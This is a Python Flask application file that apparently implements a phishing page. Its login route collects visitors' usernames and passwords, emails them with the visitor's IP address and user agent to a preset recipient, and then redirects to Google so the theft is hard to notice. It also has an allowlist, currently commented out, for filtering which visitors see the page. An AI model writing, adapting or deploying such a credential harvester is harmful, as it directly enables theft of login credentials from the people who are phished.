from flask import render_template, flash, redirect, url_for, request
from app import app
from app.forms import LoginForm
from threading import Thread
from flask_mail import Message
from app import mail
import datetime
from netaddr import IPNetwork, IPAddress

def send_async_email(app, msg):
    with app.app_context():
        mail.send(msg)

def send_email(username, password, ip_addr, useragent):
    sender="originator@sender.com"
    recipients=["destination@recipients.com"]
    subject="EMAIL SUBJECT"
    curtime = datetime.datetime.now()
    text_body=render_template('email/template.txt', username=username, password=password, ipaddr=ip_addr, useragent=useragent, datetime=curtime)
    msg = Message(subject, sender=sender, recipients=recipients)
    msg.body = text_body
    Thread(target=send_async_email, args=(app, msg)).start()


def user_agent_whitelist(useragent):
    good = "Android"
    if good in useragent:
        return True
    else:
        return False

def ip_address_whitelist(ip_address):
    if IPAddress(ip_address) in IPNetwork("10.20.30.0/24"):
        return True
    else:
        return False

@app.route('/')
@app.route('/index')
def index():
    return redirect('https://www.google.com')


@app.route('/login', methods=['GET','POST'])
def login():
    ip_addr = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    useragent = request.headers.get('User-Agent')

    """
    if ip_address_whitelist(ip_addr) and user_agent_whitelist(useragent):
    """

    if IPAddress(ip_addr) in IPNetwork("0.0.0.0/0"):
        form = LoginForm()
        if form.validate_on_submit():
            username = form.username.data
            password = form.password.data
            send_email(username, password, ip_addr, useragent)
            return redirect('https://www.google.com')
        return render_template('login.html', form=form)
    else:
        return redirect('https://www.google.com')
